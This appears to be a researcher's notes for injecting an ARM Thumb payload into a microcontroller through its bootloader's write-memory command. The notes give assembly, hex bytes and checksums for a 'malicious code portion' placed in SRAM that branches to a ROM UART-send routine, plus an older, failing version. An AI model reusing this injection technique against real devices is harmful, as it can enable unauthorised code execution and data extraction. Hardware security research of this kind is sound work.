mov     r0, #0x42
mov     r2, #0x02                   
mov     r2, r2, LSL #28
mov     r3, #0x10
mov     r3, r3, LSL #8
sub     r2, r2, r3
add     r2, r2, #0x29
;add     lr, pc, #0x04
mov     pc, r2, #0x0
NOP

Write Memory (malicious code portion):
31 CE
20003000 10
23              ; 35+1 bytes
4FF04200
4FF00202
4FEA0272
4FF01003
4FEA0323
A2EB0302
02F12902
;0FF2040E       ; 4FF042004FF002024FEA02724FF010034FEA0323A2EB030202F129020FF2040E974600BF (E018E8A7, b7)
9746
00BF            ; 
94



Write Memory (Set up R5 portion):
31 CE
20002000 00
07
00 40 00 20
01 30 00 20
76




; Older version. Gets stuck at second instruction. immediate addressing goes up to 255
mov     r0, #0x42               ; Set r0 to an arbitrary value
mov     r1, #0x20000000         ; Set up base address of send_data_through_UART
sub     r1, #0x1000             ; ''
add     r1, #0x28               ; r1 should contain 0x1fff_f028 at this point
add     lr, pc, #0x4            ; Store the return address in the link register
mov     pc, r1                  ; Branch to function
NOP

Write Memory (malicious code portion):
31 CE               ; Write mem
2000 3000 10        ; Address to be written to
17                  ; 23 + 1 bytes to be written
4FF04200
4FF00051
A1F58051
01F12801
AFF2100E
8F46
00BF                ;  4FF042004FF00051A1F5805101F12801AFF2100E8F4600BF (24 bytes to be written)
6D                  ; Checksum wout 0x17 is 7A(0x0FF675F6)